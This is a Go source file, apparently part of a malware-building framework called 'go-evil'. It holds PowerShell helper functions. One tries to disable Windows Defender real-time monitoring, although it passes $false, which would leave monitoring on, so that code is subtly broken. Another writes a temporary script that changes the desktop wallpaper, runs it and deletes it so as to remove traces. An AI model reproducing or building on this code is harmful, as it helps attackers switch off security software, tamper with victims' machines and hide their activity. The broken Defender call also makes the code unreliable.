package powershell

import (
	"os/exec"
	"runtime"
	"strings"

	"github.com/s9rA16Bf4/go-evil/utility/io"
	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
)

func Disable_defender() {
	if runtime.GOOS == "windows" {
		arg := "-command \"Set-MpPreference -DisableRealtimeMonitoring $false\""
		exec.Command("powershell", strings.Split(arg, " ")...).Run()
	}
}

func Change_wallpaper(path_to_new_wallpaper string) {
	if runtime.GOOS == "windows" {
		path_to_new_wallpaper = run_time.Check_if_variable(path_to_new_wallpaper)
		var file_content = `$setwallpapersrc = @"
	using System.Runtime.InteropServices;
	public class wallpaper
	{
	 public const int SetDesktopWallpaper = 20;
	 public const int UpdateIniFile = 0x01;
	 public const int SendWinIniChange = 0x02;
	 [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
	  private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
	 public static void SetWallpaper ( string path )
	 {
	  SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
	 }
	}"@
	Add-Type -TypeDefinition $setwallpapersrc`
		file_content += "[wallpaper]::SetWallpaper(" + path_to_new_wallpaper + ")"
		io.Create_file("wallpaper.ps1", strings.Split(file_content, "\n"))
		io.Run_file("wallpaper.ps1")    // Run the script
		io.Remove_file("wallpaper.ps1") // Removes every trace of it
	}
}
